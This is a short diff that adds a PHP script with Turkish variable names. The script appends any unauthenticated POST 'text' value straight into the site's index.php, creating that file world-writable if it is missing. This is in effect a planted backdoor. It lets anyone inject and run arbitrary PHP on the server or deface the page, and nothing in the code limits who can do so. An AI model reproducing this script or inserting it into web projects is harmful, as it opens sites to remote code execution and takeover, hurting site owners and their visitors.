@@ -1,0 +1,18 @@
+<?php  
+$dosya_adi = "index.php"; 
+$deger = $_POST["text"]; 
+$yazilacak_deger = "$deger"; 
+if ($deger) {  
+if (!file_exists($dosya_adi)){    
+touch($dosya_adi); 
+chmod($dosya_adi,0666);    
+} 
+$dosyaya_baglanti = fopen($dosya_adi,"a+"); 
+if (!fwrite($dosyaya_baglanti,$yazilacak_deger)){ 
+exit; 
+}  
+} 
+
+?>
+
+
